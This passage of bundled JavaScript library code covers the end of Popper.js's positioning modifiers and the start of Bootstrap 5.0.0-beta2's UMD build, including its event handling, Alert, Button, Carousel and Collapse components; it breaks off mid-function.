                  return "preventOverflow" === t.name;
                }).boundaries;
              if (
                e.bottom < n.top ||
                e.left > n.right ||
                e.top > n.bottom ||
                e.right < n.left
              ) {
                if (!0 === t.hide) return t;
                (t.hide = !0), (t.attributes["x-out-of-boundaries"] = "");
              } else {
                if (!1 === t.hide) return t;
                (t.hide = !1), (t.attributes["x-out-of-boundaries"] = !1);
              }
              return t;
            },
          },
          computeStyle: {
            order: 850,
            enabled: !0,
            fn: function (t, e) {
              var n = e.x,
                i = e.y,
                o = t.offsets.popper,
                s = A(t.instance.modifiers, function (t) {
                  return "applyStyle" === t.name;
                }).gpuAcceleration;
              void 0 !== s &&
                console.warn(
                  "WARNING: `gpuAcceleration` option moved to `computeStyle` modifier and will not be supported in future versions of Popper.js!"
                );
              var a,
                l,
                c = void 0 === s ? e.gpuAcceleration : s,
                u = p(r(t.instance.popper)),
                d = { position: o.position },
                h = {
                  left: F(o.left),
                  top: q(o.top),
                  bottom: q(o.bottom),
                  right: F(o.right),
                },
                f = "bottom" === n ? "top" : "bottom",
                g = "right" === i ? "left" : "right",
                m = D("transform");
              if (
                ((l = "bottom" == f ? -u.height + h.bottom : h.top),
                (a = "right" == g ? -u.width + h.right : h.left),
                c && m)
              )
                (d[m] = "translate3d(" + a + "px, " + l + "px, 0)"),
                  (d[f] = 0),
                  (d[g] = 0),
                  (d.willChange = "transform");
              else {
                var v = "bottom" == f ? -1 : 1,
                  y = "right" == g ? -1 : 1;
                (d[f] = l * v), (d[g] = a * y), (d.willChange = f + ", " + g);
              }
              var b = { "x-placement": t.placement };
              return (
                (t.attributes = nt({}, b, t.attributes)),
                (t.styles = nt({}, d, t.styles)),
                (t.arrowStyles = nt({}, t.offsets.arrow, t.arrowStyles)),
                t
              );
            },
            gpuAcceleration: !0,
            x: "bottom",
            y: "right",
          },
          applyStyle: {
            order: 900,
            enabled: !0,
            fn: function (t) {
              return (
                B(t.instance.popper, t.styles),
                (function (t, e) {
                  Object.keys(e).forEach(function (n) {
                    !1 === e[n]
                      ? t.removeAttribute(n)
                      : t.setAttribute(n, e[n]);
                  });
                })(t.instance.popper, t.attributes),
                t.arrowElement &&
                  Object.keys(t.arrowStyles).length &&
                  B(t.arrowElement, t.arrowStyles),
                t
              );
            },
            onLoad: function (t, e, n, i, o) {
              var r = x(o, e, t, n.positionFixed),
                s = w(
                  n.placement,
                  r,
                  e,
                  t,
                  n.modifiers.flip.boundariesElement,
                  n.modifiers.flip.padding
                );
              return (
                e.setAttribute("x-placement", s),
                B(e, { position: n.positionFixed ? "fixed" : "absolute" }),
                n
              );
            },
            gpuAcceleration: void 0,
          },
        },
      }),
      lt
    );
  }),
  (function (t, e) {
    "object" == typeof exports && "undefined" != typeof module
      ? (module.exports = e())
      : "function" == typeof define && define.amd
      ? define(e)
      : ((t =
          "undefined" != typeof globalThis ? globalThis : t || self).bootstrap =
          e());
  })(this, function () {
    "use strict";
    function t(t, e) {
      for (var n = 0; n < e.length; n++) {
        var i = e[n];
        (i.enumerable = i.enumerable || !1),
          (i.configurable = !0),
          "value" in i && (i.writable = !0),
          Object.defineProperty(t, i.key, i);
      }
    }
    function e(e, n, i) {
      return n && t(e.prototype, n), i && t(e, i), e;
    }
    function n() {
      return (n =
        Object.assign ||
        function (t) {
          for (var e = 1; e < arguments.length; e++) {
            var n = arguments[e];
            for (var i in n)
              Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]);
          }
          return t;
        }).apply(this, arguments);
    }
    function i(t, e) {
      var n, i;
      (t.prototype = Object.create(e.prototype)),
        (t.prototype.constructor = t),
        (n = t),
        (i = e),
        (
          Object.setPrototypeOf ||
          function (t, e) {
            return (t.__proto__ = e), t;
          }
        )(n, i);
    }
    var o,
      r,
      s = function (t) {
        do {
          t += Math.floor(1e6 * Math.random());
        } while (document.getElementById(t));
        return t;
      },
      a = function (t) {
        var e = t.getAttribute("data-bs-target");
        if (!e || "#" === e) {
          var n = t.getAttribute("href");
          if (!n || (!n.includes("#") && !n.startsWith("."))) return null;
          n.includes("#") && !n.startsWith("#") && (n = "#" + n.split("#")[1]),
            (e = n && "#" !== n ? n.trim() : null);
        }
        return e;
      },
      l = function (t) {
        var e = a(t);
        return e && document.querySelector(e) ? e : null;
      },
      c = function (t) {
        var e = a(t);
        return e ? document.querySelector(e) : null;
      },
      u = function (t) {
        if (!t) return 0;
        var e = window.getComputedStyle(t),
          n = e.transitionDuration,
          i = e.transitionDelay,
          o = Number.parseFloat(n),
          r = Number.parseFloat(i);
        return o || r
          ? ((n = n.split(",")[0]),
            (i = i.split(",")[0]),
            1e3 * (Number.parseFloat(n) + Number.parseFloat(i)))
          : 0;
      },
      d = function (t) {
        t.dispatchEvent(new Event("transitionend"));
      },
      h = function (t) {
        return (t[0] || t).nodeType;
      },
      f = function (t, e) {
        var n = !1,
          i = e + 5;
        t.addEventListener("transitionend", function e() {
          (n = !0), t.removeEventListener("transitionend", e);
        }),
          setTimeout(function () {
            n || d(t);
          }, i);
      },
      p = function (t, e, n) {
        Object.keys(n).forEach(function (i) {
          var o,
            r = n[i],
            s = e[i],
            a =
              s && h(s)
                ? "element"
                : null == (o = s)
                ? "" + o
                : {}.toString
                    .call(o)
                    .match(/\s([a-z]+)/i)[1]
                    .toLowerCase();
          if (!new RegExp(r).test(a))
            throw new TypeError(
              t.toUpperCase() +
                ': Option "' +
                i +
                '" provided type "' +
                a +
                '" but expected type "' +
                r +
                '".'
            );
        });
      },
      g = function (t) {
        if (!t) return !1;
        if (t.style && t.parentNode && t.parentNode.style) {
          var e = getComputedStyle(t),
            n = getComputedStyle(t.parentNode);
          return (
            "none" !== e.display &&
            "none" !== n.display &&
            "hidden" !== e.visibility
          );
        }
        return !1;
      },
      m = function () {
        return function () {};
      },
      v = function (t) {
        return t.offsetHeight;
      },
      y = function () {
        var t = window.jQuery;
        return t && !document.body.hasAttribute("data-bs-no-jquery") ? t : null;
      },
      b = "rtl" === document.documentElement.dir,
      _ = function (t, e) {
        var n;
        (n = function () {
          var n = y();
          if (n) {
            var i = n.fn[t];
            (n.fn[t] = e.jQueryInterface),
              (n.fn[t].Constructor = e),
              (n.fn[t].noConflict = function () {
                return (n.fn[t] = i), e.jQueryInterface;
              });
          }
        }),
          "loading" === document.readyState
            ? document.addEventListener("DOMContentLoaded", n)
            : n();
      },
      w =
        ((o = {}),
        (r = 1),
        {
          set: function (t, e, n) {
            void 0 === t.bsKey && ((t.bsKey = { key: e, id: r }), r++),
              (o[t.bsKey.id] = n);
          },
          get: function (t, e) {
            if (!t || void 0 === t.bsKey) return null;
            var n = t.bsKey;
            return n.key === e ? o[n.id] : null;
          },
          delete: function (t, e) {
            if (void 0 !== t.bsKey) {
              var n = t.bsKey;
              n.key === e && (delete o[n.id], delete t.bsKey);
            }
          },
        }),
      x = function (t, e, n) {
        w.set(t, e, n);
      },
      E = function (t, e) {
        return w.get(t, e);
      },
      T = /[^.]*(?=\..*)\.|.*/,
      C = /\..*/,
      A = /::\d+$/,
      k = {},
      S = 1,
      L = { mouseenter: "mouseover", mouseleave: "mouseout" },
      D = new Set([
        "click",
        "dblclick",
        "mouseup",
        "mousedown",
        "contextmenu",
        "mousewheel",
        "DOMMouseScroll",
        "mouseover",
        "mouseout",
        "mousemove",
        "selectstart",
        "selectend",
        "keydown",
        "keypress",
        "keyup",
        "orientationchange",
        "touchstart",
        "touchmove",
        "touchend",
        "touchcancel",
        "pointerdown",
        "pointermove",
        "pointerup",
        "pointerleave",
        "pointercancel",
        "gesturestart",
        "gesturechange",
        "gestureend",
        "focus",
        "blur",
        "change",
        "reset",
        "select",
        "submit",
        "focusin",
        "focusout",
        "load",
        "unload",
        "beforeunload",
        "resize",
        "move",
        "DOMContentLoaded",
        "readystatechange",
        "error",
        "abort",
        "scroll",
      ]);
    function N(t, e) {
      return (e && e + "::" + S++) || t.uidEvent || S++;
    }
    function O(t) {
      var e = N(t);
      return (t.uidEvent = e), (k[e] = k[e] || {}), k[e];
    }
    function j(t, e, n) {
      void 0 === n && (n = null);
      for (var i = Object.keys(t), o = 0, r = i.length; o < r; o++) {
        var s = t[i[o]];
        if (s.originalHandler === e && s.delegationSelector === n) return s;
      }
      return null;
    }
    function P(t, e, n) {
      var i = "string" == typeof e,
        o = i ? n : e,
        r = t.replace(C, ""),
        s = L[r];
      return s && (r = s), D.has(r) || (r = t), [i, o, r];
    }
    function H(t, e, n, i, o) {
      if ("string" == typeof e && t) {
        n || ((n = i), (i = null));
        var r = P(e, n, i),
          s = r[0],
          a = r[1],
          l = r[2],
          c = O(t),
          u = c[l] || (c[l] = {}),
          d = j(u, a, s ? n : null);
        if (d) d.oneOff = d.oneOff && o;
        else {
          var h = N(a, e.replace(T, "")),
            f = s
              ? (function (t, e, n) {
                  return function i(o) {
                    for (
                      var r = t.querySelectorAll(e), s = o.target;
                      s && s !== this;
                      s = s.parentNode
                    )
                      for (var a = r.length; a--; )
                        if (r[a] === s)
                          return (
                            (o.delegateTarget = s),
                            i.oneOff && z.off(t, o.type, n),
                            n.apply(s, [o])
                          );
                    return null;
                  };
                })(t, n, i)
              : (function (t, e) {
                  return function n(i) {
                    return (
                      (i.delegateTarget = t),
                      n.oneOff && z.off(t, i.type, e),
                      e.apply(t, [i])
                    );
                  };
                })(t, n);
          (f.delegationSelector = s ? n : null),
            (f.originalHandler = a),
            (f.oneOff = o),
            (f.uidEvent = h),
            (u[h] = f),
            t.addEventListener(l, f, s);
        }
      }
    }
    function M(t, e, n, i, o) {
      var r = j(e[n], i, o);
      r && (t.removeEventListener(n, r, Boolean(o)), delete e[n][r.uidEvent]);
    }
    var z = {
        on: function (t, e, n, i) {
          H(t, e, n, i, !1);
        },
        one: function (t, e, n, i) {
          H(t, e, n, i, !0);
        },
        off: function (t, e, n, i) {
          if ("string" == typeof e && t) {
            var o = P(e, n, i),
              r = o[0],
              s = o[1],
              a = o[2],
              l = a !== e,
              c = O(t),
              u = e.startsWith(".");
            if (void 0 === s) {
              u &&
                Object.keys(c).forEach(function (n) {
                  !(function (t, e, n, i) {
                    var o = e[n] || {};
                    Object.keys(o).forEach(function (r) {
                      if (r.includes(i)) {
                        var s = o[r];
                        M(t, e, n, s.originalHandler, s.delegationSelector);
                      }
                    });
                  })(t, c, n, e.slice(1));
                });
              var d = c[a] || {};
              Object.keys(d).forEach(function (n) {
                var i = n.replace(A, "");
                if (!l || e.includes(i)) {
                  var o = d[n];
                  M(t, c, a, o.originalHandler, o.delegationSelector);
                }
              });
            } else {
              if (!c || !c[a]) return;
              M(t, c, a, s, r ? n : null);
            }
          }
        },
        trigger: function (t, e, n) {
          if ("string" != typeof e || !t) return null;
          var i,
            o = y(),
            r = e.replace(C, ""),
            s = e !== r,
            a = D.has(r),
            l = !0,
            c = !0,
            u = !1,
            d = null;
          return (
            s &&
              o &&
              ((i = o.Event(e, n)),
              o(t).trigger(i),
              (l = !i.isPropagationStopped()),
              (c = !i.isImmediatePropagationStopped()),
              (u = i.isDefaultPrevented())),
            a
              ? (d = document.createEvent("HTMLEvents")).initEvent(r, l, !0)
              : (d = new CustomEvent(e, { bubbles: l, cancelable: !0 })),
            void 0 !== n &&
              Object.keys(n).forEach(function (t) {
                Object.defineProperty(d, t, {
                  get: function () {
                    return n[t];
                  },
                });
              }),
            u && d.preventDefault(),
            c && t.dispatchEvent(d),
            d.defaultPrevented && void 0 !== i && i.preventDefault(),
            d
          );
        },
      },
      B = (function () {
        function t(t) {
          t && ((this._element = t), x(t, this.constructor.DATA_KEY, this));
        }
        return (
          (t.prototype.dispose = function () {
            var t, e;
            (t = this._element),
              (e = this.constructor.DATA_KEY),
              w.delete(t, e),
              (this._element = null);
          }),
          (t.getInstance = function (t) {
            return E(t, this.DATA_KEY);
          }),
          e(t, null, [
            {
              key: "VERSION",
              get: function () {
                return "5.0.0-beta2";
              },
            },
          ]),
          t
        );
      })(),
      I = (function (t) {
        function n() {
          return t.apply(this, arguments) || this;
        }
        i(n, t);
        var o = n.prototype;
        return (
          (o.close = function (t) {
            var e = t ? this._getRootElement(t) : this._element,
              n = this._triggerCloseEvent(e);
            null === n || n.defaultPrevented || this._removeElement(e);
          }),
          (o._getRootElement = function (t) {
            return c(t) || t.closest(".alert");
          }),
          (o._triggerCloseEvent = function (t) {
            return z.trigger(t, "close.bs.alert");
          }),
          (o._removeElement = function (t) {
            var e = this;
            if ((t.classList.remove("show"), t.classList.contains("fade"))) {
              var n = u(t);
              z.one(t, "transitionend", function () {
                return e._destroyElement(t);
              }),
                f(t, n);
            } else this._destroyElement(t);
          }),
          (o._destroyElement = function (t) {
            t.parentNode && t.parentNode.removeChild(t),
              z.trigger(t, "closed.bs.alert");
          }),
          (n.jQueryInterface = function (t) {
            return this.each(function () {
              var e = E(this, "bs.alert");
              e || (e = new n(this)), "close" === t && e[t](this);
            });
          }),
          (n.handleDismiss = function (t) {
            return function (e) {
              e && e.preventDefault(), t.close(this);
            };
          }),
          e(n, null, [
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.alert";
              },
            },
          ]),
          n
        );
      })(B);
    z.on(
      document,
      "click.bs.alert.data-api",
      '[data-bs-dismiss="alert"]',
      I.handleDismiss(new I())
    ),
      _("alert", I);
    var $ = (function (t) {
      function n() {
        return t.apply(this, arguments) || this;
      }
      return (
        i(n, t),
        (n.prototype.toggle = function () {
          this._element.setAttribute(
            "aria-pressed",
            this._element.classList.toggle("active")
          );
        }),
        (n.jQueryInterface = function (t) {
          return this.each(function () {
            var e = E(this, "bs.button");
            e || (e = new n(this)), "toggle" === t && e[t]();
          });
        }),
        e(n, null, [
          {
            key: "DATA_KEY",
            get: function () {
              return "bs.button";
            },
          },
        ]),
        n
      );
    })(B);
    function R(t) {
      return (
        "true" === t ||
        ("false" !== t &&
          (t === Number(t).toString()
            ? Number(t)
            : "" === t || "null" === t
            ? null
            : t))
      );
    }
    function W(t) {
      return t.replace(/[A-Z]/g, function (t) {
        return "-" + t.toLowerCase();
      });
    }
    z.on(
      document,
      "click.bs.button.data-api",
      '[data-bs-toggle="button"]',
      function (t) {
        t.preventDefault();
        var e = t.target.closest('[data-bs-toggle="button"]'),
          n = E(e, "bs.button");
        n || (n = new $(e)), n.toggle();
      }
    ),
      _("button", $);
    var q = {
        setDataAttribute: function (t, e, n) {
          t.setAttribute("data-bs-" + W(e), n);
        },
        removeDataAttribute: function (t, e) {
          t.removeAttribute("data-bs-" + W(e));
        },
        getDataAttributes: function (t) {
          if (!t) return {};
          var e = {};
          return (
            Object.keys(t.dataset)
              .filter(function (t) {
                return t.startsWith("bs");
              })
              .forEach(function (n) {
                var i = n.replace(/^bs/, "");
                (i = i.charAt(0).toLowerCase() + i.slice(1, i.length)),
                  (e[i] = R(t.dataset[n]));
              }),
            e
          );
        },
        getDataAttribute: function (t, e) {
          return R(t.getAttribute("data-bs-" + W(e)));
        },
        offset: function (t) {
          var e = t.getBoundingClientRect();
          return {
            top: e.top + document.body.scrollTop,
            left: e.left + document.body.scrollLeft,
          };
        },
        position: function (t) {
          return { top: t.offsetTop, left: t.offsetLeft };
        },
      },
      F = function (t, e) {
        var n;
        return (
          void 0 === e && (e = document.documentElement),
          (n = []).concat.apply(
            n,
            Element.prototype.querySelectorAll.call(e, t)
          )
        );
      },
      U = function (t, e) {
        return (
          void 0 === e && (e = document.documentElement),
          Element.prototype.querySelector.call(e, t)
        );
      },
      X = function (t, e) {
        var n;
        return (n = []).concat.apply(n, t.children).filter(function (t) {
          return t.matches(e);
        });
      },
      V = function (t, e) {
        for (var n = t.previousElementSibling; n; ) {
          if (n.matches(e)) return [n];
          n = n.previousElementSibling;
        }
        return [];
      },
      Y = {
        interval: 5e3,
        keyboard: !0,
        slide: !1,
        pause: "hover",
        wrap: !0,
        touch: !0,
      },
      K = {
        interval: "(number|boolean)",
        keyboard: "boolean",
        slide: "(boolean|string)",
        pause: "(string|boolean)",
        wrap: "boolean",
        touch: "boolean",
      },
      Q = (function (t) {
        function o(e, n) {
          var i;
          return (
            ((i = t.call(this, e) || this)._items = null),
            (i._interval = null),
            (i._activeElement = null),
            (i._isPaused = !1),
            (i._isSliding = !1),
            (i.touchTimeout = null),
            (i.touchStartX = 0),
            (i.touchDeltaX = 0),
            (i._config = i._getConfig(n)),
            (i._indicatorsElement = U(".carousel-indicators", i._element)),
            (i._touchSupported =
              "ontouchstart" in document.documentElement ||
              navigator.maxTouchPoints > 0),
            (i._pointerEvent = Boolean(window.PointerEvent)),
            i._addEventListeners(),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.next = function () {
            this._isSliding || this._slide("next");
          }),
          (r.nextWhenVisible = function () {
            !document.hidden && g(this._element) && this.next();
          }),
          (r.prev = function () {
            this._isSliding || this._slide("prev");
          }),
          (r.pause = function (t) {
            t || (this._isPaused = !0),
              U(".carousel-item-next, .carousel-item-prev", this._element) &&
                (d(this._element), this.cycle(!0)),
              clearInterval(this._interval),
              (this._interval = null);
          }),
          (r.cycle = function (t) {
            t || (this._isPaused = !1),
              this._interval &&
                (clearInterval(this._interval), (this._interval = null)),
              this._config &&
                this._config.interval &&
                !this._isPaused &&
                (this._updateInterval(),
                (this._interval = setInterval(
                  (document.visibilityState
                    ? this.nextWhenVisible
                    : this.next
                  ).bind(this),
                  this._config.interval
                )));
          }),
          (r.to = function (t) {
            var e = this;
            this._activeElement = U(".active.carousel-item", this._element);
            var n = this._getItemIndex(this._activeElement);
            if (!(t > this._items.length - 1 || t < 0))
              if (this._isSliding)
                z.one(this._element, "slid.bs.carousel", function () {
                  return e.to(t);
                });
              else {
                if (n === t) return this.pause(), void this.cycle();
                var i = t > n ? "next" : "prev";
                this._slide(i, this._items[t]);
              }
          }),
          (r.dispose = function () {
            t.prototype.dispose.call(this),
              z.off(this._element, ".bs.carousel"),
              (this._items = null),
              (this._config = null),
              (this._interval = null),
              (this._isPaused = null),
              (this._isSliding = null),
              (this._activeElement = null),
              (this._indicatorsElement = null);
          }),
          (r._getConfig = function (t) {
            return (t = n({}, Y, t)), p("carousel", t, K), t;
          }),
          (r._handleSwipe = function () {
            var t = Math.abs(this.touchDeltaX);
            if (!(t <= 40)) {
              var e = t / this.touchDeltaX;
              (this.touchDeltaX = 0),
                e > 0 && (b ? this.next() : this.prev()),
                e < 0 && (b ? this.prev() : this.next());
            }
          }),
          (r._addEventListeners = function () {
            var t = this;
            this._config.keyboard &&
              z.on(this._element, "keydown.bs.carousel", function (e) {
                return t._keydown(e);
              }),
              "hover" === this._config.pause &&
                (z.on(this._element, "mouseenter.bs.carousel", function (e) {
                  return t.pause(e);
                }),
                z.on(this._element, "mouseleave.bs.carousel", function (e) {
                  return t.cycle(e);
                })),
              this._config.touch &&
                this._touchSupported &&
                this._addTouchEventListeners();
          }),
          (r._addTouchEventListeners = function () {
            var t = this,
              e = function (e) {
                !t._pointerEvent ||
                ("pen" !== e.pointerType && "touch" !== e.pointerType)
                  ? t._pointerEvent || (t.touchStartX = e.touches[0].clientX)
                  : (t.touchStartX = e.clientX);
              },
              n = function (e) {
                !t._pointerEvent ||
                  ("pen" !== e.pointerType && "touch" !== e.pointerType) ||
                  (t.touchDeltaX = e.clientX - t.touchStartX),
                  t._handleSwipe(),
                  "hover" === t._config.pause &&
                    (t.pause(),
                    t.touchTimeout && clearTimeout(t.touchTimeout),
                    (t.touchTimeout = setTimeout(function (e) {
                      return t.cycle(e);
                    }, 500 + t._config.interval)));
              };
            F(".carousel-item img", this._element).forEach(function (t) {
              z.on(t, "dragstart.bs.carousel", function (t) {
                return t.preventDefault();
              });
            }),
              this._pointerEvent
                ? (z.on(this._element, "pointerdown.bs.carousel", function (t) {
                    return e(t);
                  }),
                  z.on(this._element, "pointerup.bs.carousel", function (t) {
                    return n(t);
                  }),
                  this._element.classList.add("pointer-event"))
                : (z.on(this._element, "touchstart.bs.carousel", function (t) {
                    return e(t);
                  }),
                  z.on(this._element, "touchmove.bs.carousel", function (e) {
                    return (function (e) {
                      e.touches && e.touches.length > 1
                        ? (t.touchDeltaX = 0)
                        : (t.touchDeltaX =
                            e.touches[0].clientX - t.touchStartX);
                    })(e);
                  }),
                  z.on(this._element, "touchend.bs.carousel", function (t) {
                    return n(t);
                  }));
          }),
          (r._keydown = function (t) {
            /input|textarea/i.test(t.target.tagName) ||
              ("ArrowLeft" === t.key
                ? (t.preventDefault(), b ? this.next() : this.prev())
                : "ArrowRight" === t.key &&
                  (t.preventDefault(), b ? this.prev() : this.next()));
          }),
          (r._getItemIndex = function (t) {
            return (
              (this._items =
                t && t.parentNode ? F(".carousel-item", t.parentNode) : []),
              this._items.indexOf(t)
            );
          }),
          (r._getItemByDirection = function (t, e) {
            var n = "next" === t,
              i = "prev" === t,
              o = this._getItemIndex(e),
              r = this._items.length - 1;
            if (((i && 0 === o) || (n && o === r)) && !this._config.wrap)
              return e;
            var s = (o + ("prev" === t ? -1 : 1)) % this._items.length;
            return -1 === s
              ? this._items[this._items.length - 1]
              : this._items[s];
          }),
          (r._triggerSlideEvent = function (t, e) {
            var n = this._getItemIndex(t),
              i = this._getItemIndex(U(".active.carousel-item", this._element));
            return z.trigger(this._element, "slide.bs.carousel", {
              relatedTarget: t,
              direction: e,
              from: i,
              to: n,
            });
          }),
          (r._setActiveIndicatorElement = function (t) {
            if (this._indicatorsElement) {
              var e = U(".active", this._indicatorsElement);
              e.classList.remove("active"), e.removeAttribute("aria-current");
              for (
                var n = F("[data-bs-target]", this._indicatorsElement), i = 0;
                i < n.length;
                i++
              )
                if (
                  Number.parseInt(n[i].getAttribute("data-bs-slide-to"), 10) ===
                  this._getItemIndex(t)
                ) {
                  n[i].classList.add("active"),
                    n[i].setAttribute("aria-current", "true");
                  break;
                }
            }
          }),
          (r._updateInterval = function () {
            var t =
              this._activeElement || U(".active.carousel-item", this._element);
            if (t) {
              var e = Number.parseInt(t.getAttribute("data-bs-interval"), 10);
              e
                ? ((this._config.defaultInterval =
                    this._config.defaultInterval || this._config.interval),
                  (this._config.interval = e))
                : (this._config.interval =
                    this._config.defaultInterval || this._config.interval);
            }
          }),
          (r._slide = function (t, e) {
            var n = this,
              i = U(".active.carousel-item", this._element),
              o = this._getItemIndex(i),
              r = e || (i && this._getItemByDirection(t, i)),
              s = this._getItemIndex(r),
              a = Boolean(this._interval),
              l = "next" === t ? "carousel-item-start" : "carousel-item-end",
              c = "next" === t ? "carousel-item-next" : "carousel-item-prev",
              d = "next" === t ? "left" : "right";
            if (r && r.classList.contains("active")) this._isSliding = !1;
            else if (
              !this._triggerSlideEvent(r, d).defaultPrevented &&
              i &&
              r
            ) {
              if (
                ((this._isSliding = !0),
                a && this.pause(),
                this._setActiveIndicatorElement(r),
                (this._activeElement = r),
                this._element.classList.contains("slide"))
              ) {
                r.classList.add(c),
                  v(r),
                  i.classList.add(l),
                  r.classList.add(l);
                var h = u(i);
                z.one(i, "transitionend", function () {
                  r.classList.remove(l, c),
                    r.classList.add("active"),
                    i.classList.remove("active", c, l),
                    (n._isSliding = !1),
                    setTimeout(function () {
                      z.trigger(n._element, "slid.bs.carousel", {
                        relatedTarget: r,
                        direction: d,
                        from: o,
                        to: s,
                      });
                    }, 0);
                }),
                  f(i, h);
              } else
                i.classList.remove("active"),
                  r.classList.add("active"),
                  (this._isSliding = !1),
                  z.trigger(this._element, "slid.bs.carousel", {
                    relatedTarget: r,
                    direction: d,
                    from: o,
                    to: s,
                  });
              a && this.cycle();
            }
          }),
          (o.carouselInterface = function (t, e) {
            var i = E(t, "bs.carousel"),
              r = n({}, Y, q.getDataAttributes(t));
            "object" == typeof e && (r = n({}, r, e));
            var s = "string" == typeof e ? e : r.slide;
            if ((i || (i = new o(t, r)), "number" == typeof e)) i.to(e);
            else if ("string" == typeof s) {
              if (void 0 === i[s])
                throw new TypeError('No method named "' + s + '"');
              i[s]();
            } else r.interval && r.ride && (i.pause(), i.cycle());
          }),
          (o.jQueryInterface = function (t) {
            return this.each(function () {
              o.carouselInterface(this, t);
            });
          }),
          (o.dataApiClickHandler = function (t) {
            var e = c(this);
            if (e && e.classList.contains("carousel")) {
              var i = n({}, q.getDataAttributes(e), q.getDataAttributes(this)),
                r = this.getAttribute("data-bs-slide-to");
              r && (i.interval = !1),
                o.carouselInterface(e, i),
                r && E(e, "bs.carousel").to(r),
                t.preventDefault();
            }
          }),
          e(o, null, [
            {
              key: "Default",
              get: function () {
                return Y;
              },
            },
            {
              key: "DATA_KEY",
              get: function () {
                return "bs.carousel";
              },
            },
          ]),
          o
        );
      })(B);
    z.on(
      document,
      "click.bs.carousel.data-api",
      "[data-bs-slide], [data-bs-slide-to]",
      Q.dataApiClickHandler
    ),
      z.on(window, "load.bs.carousel.data-api", function () {
        for (
          var t = F('[data-bs-ride="carousel"]'), e = 0, n = t.length;
          e < n;
          e++
        )
          Q.carouselInterface(t[e], E(t[e], "bs.carousel"));
      }),
      _("carousel", Q);
    var G = { toggle: !0, parent: "" },
      Z = { toggle: "boolean", parent: "(string|element)" },
      J = (function (t) {
        function o(e, n) {
          var i;
          ((i = t.call(this, e) || this)._isTransitioning = !1),
            (i._config = i._getConfig(n)),
            (i._triggerArray = F(
              '[data-bs-toggle="collapse"][href="#' +
                e.id +
                '"],[data-bs-toggle="collapse"][data-bs-target="#' +
                e.id +
                '"]'
            ));
          for (
            var o = F('[data-bs-toggle="collapse"]'), r = 0, s = o.length;
            r < s;
            r++
          ) {
            var a = o[r],
              c = l(a),
              u = F(c).filter(function (t) {
                return t === e;
              });
            null !== c &&
              u.length &&
              ((i._selector = c), i._triggerArray.push(a));
          }
          return (
            (i._parent = i._config.parent ? i._getParent() : null),
            i._config.parent ||
              i._addAriaAndCollapsedClass(i._element, i._triggerArray),
            i._config.toggle && i.toggle(),
            i
          );
        }
        i(o, t);
        var r = o.prototype;
        return (
          (r.toggle = function () {
            this._element.classList.contains("show")
              ? this.hide()
              : this.show();
          }),
          (r.show = function () {
            var t = this;
            if (
              !this._isTransitioning &&
              !this._element.classList.contains("show")
            ) {
              var e, n;
              this._parent &&
                0 ===
                  (e = F(".show, .collapsing", this._parent).filter(function (
                    e
                  ) {
                    return "string" == typeof t._config.parent
                      ? e.getAttribute("data-bs-parent") === t._config.parent
                      : e.classList.contains("collapse");
                  })).length &&
                (e = null);
              var i = U(this._selector);
              if (e) {
                var r = e.find(function (t) {
                  return i !== t;
                });
                if ((n = r ? E(r, "bs.collapse") : null) && n._isTransitioning)
                  return;
              }
              if (
                !z.trigger(this._element, "show.bs.collapse").defaultPrevented
              ) {
                e &&
                  e.forEach(function (t) {
                    i !== t && o.collapseInterface(t, "hide"),
                      n || x(t, "bs.collapse", null);
                  });
                var s = this._getDimension();
                this._element.classList.remove("collapse"),
                  this._element.classList.add("collapsing"),
                  (this._element.style[s] = 0),
                  this._triggerArray.length &&
                    this._triggerArray.forEach(function (t) {
                      t.classList.remove("collapsed"),
                        t.setAttribute("aria-expanded", !0);
                    }),
                  this.setTransitioning(!0);
                var a = "scroll" + (s[0].toUpperCase() + s.slice(1)),
                  l = u(this._element);
                z.one(this._element, "transitionend", function () {
                  t._element.classList.remove("collapsing"),
                    t._element.classList.add("collapse", "show"),
                    (t._element.style[s] = ""),
                    t.setTransitioning(!1),
                    z.trigger(t._element, "shown.bs.collapse");
                }),
                  f(this._element, l),
                  (this._element.style[s] = this._element[a] + "px");
              }
            }
          }),
          (r.hide = function () {
            var t = this;
            if (
              !this._isTransitioning &&
              this._element.classList.contains("show") &&
              !z.trigger(this._element, "hide.bs.collapse").defaultPrevented
            ) {
              var e = this._getDimension();
              (this._element.style[e] =
                this._element.getBoundingClientRect()[e] + "px"),
                v(this._element),
                this._element.classList.add("collapsing"),
                this._element.classList.remove("collapse", "show");
              var n = this._triggerArray.length;
              if (n > 0)
                for (var i = 0; i < n; i++) {
                  var o = this._triggerArray[i],
                    r = c(o);
                  r &&
                    !r.classList.contains("show") &&
                    (o.classList.add("collapsed"),
                    o.setAttribute("aria-expanded", !1));
                }
              this.setTransitioning(!0), (this._element.style[e] = "");
              var s = u(this._element);
              z.one(this._element, "transitionend", function () {
                t.setTransitioning(!1),
                  t._element.classList.remove("collapsing"),
                  t._element.classList.add("collapse"),
                  z.trigger(t._element, "hidden.bs.collapse");
              }),
                f(this._element, s);
            }
          }),
          (r.setTransitioning = function (t) {
            this._isTransitioning = t;
          }),
          (r.dispose = function () {
            t.prototype.dispose.call(this),
              (this._config = null),
              (this._parent = null),
              (this._triggerArray = null),
              (this._isTransitioning = null);
          }),
          (r._getConfig = function (t) {
            return (
              ((t = n({}, G, t)).toggle = Boolean(t.toggle)),
              p("collapse", t, Z),
              t
            );
          }),
          (r._getDimension = function () {
            return this._element.classList.contains("width")
              ? "width"
              : "height";
          }),
          (r._getParent = function () {
            var t = this,
              e = this._config.parent;
            return (
              h(e)
                ? (void 0 === e.jquery && void 0 === e[0]) || (e = e[0])
                : (e = U(e)),
              F(
                '[data-bs-toggle="collapse"][data-bs-parent="' + e + '"]',
                e
              ).forEach(function (e) {
                var n = c(e);
                t._addAriaAndCollapsedClass(n, [e]);
              }),
              e
            );
          }),
          (r._addAriaAndCollapsedClass = function (t, e) {
            if (t && e.length) {
              var n = t.classList.contains("show");
              e.forEach(function (t) {
                n
                  ? t.classList.remove("collapsed")
                  : t.classList.add("collapsed"),
                  t.setAttribute("aria-expanded", n);
              });
            }
          }),
          (o.collapseInterface = function (t, e) {
            var i = E(t, "bs.collapse"),
              r = n(
                {},
                G,
                q.getDataAttributes(t),
                "object" == typeof e && e ? e : {}
              );
            if (
              (!i &&
                r.toggle &&
                "string" == typeof e &&
                /show|hide/.test(e) &&
                (r.toggle = !1),
              i || (i = new o(t, r)),
              "string" == typeof e)
            ) {
              if (void 0 === i[e])
